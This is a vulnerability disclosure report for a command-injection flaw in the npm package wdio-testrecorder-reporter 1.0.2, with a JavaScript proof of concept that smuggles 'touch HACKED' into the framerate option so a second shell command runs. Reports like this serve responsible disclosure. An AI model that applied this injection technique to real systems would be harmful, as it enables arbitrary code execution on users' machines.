## Details
I would like to report a `RCE` issue in the `wdio-testrecorder-reporter` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

## Module
* **module name:** `wdio-testrecorder-reporter`
* **version:** `1.0.2`
* **npm page:** `https://www.npmjs.com/package/wdio-testrecorder-reporter`

## Module Description
> A reporter for WDIO v5 that generates videos of your wdio test executions.

## Module Stats
[166] downloads in the last week

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/tamil777selvan/wdio-testrecorder-reporter/blob/master/index.js#L111

## POC

```js
// poc.js
var wdio = require('wdio-testrecorder-reporter').default;
var conv = new wdio({'outputDir':'s', 'videoOutputPath':'s', 'framerate':'test; touch HACKED; #'});
suiteStat = {};
suiteStat.complete = function(){};
conv._events['suite:start']({'type':'scenario', 'title':'s'});
conv._events['suite:end']({uid:'s'});
conv._events['suite:start']({'type':'scenario'})
conv._events['suite:end']({});

```

## Impact
`RCE` via command formatting on `wdio-testrecorder-reporter`
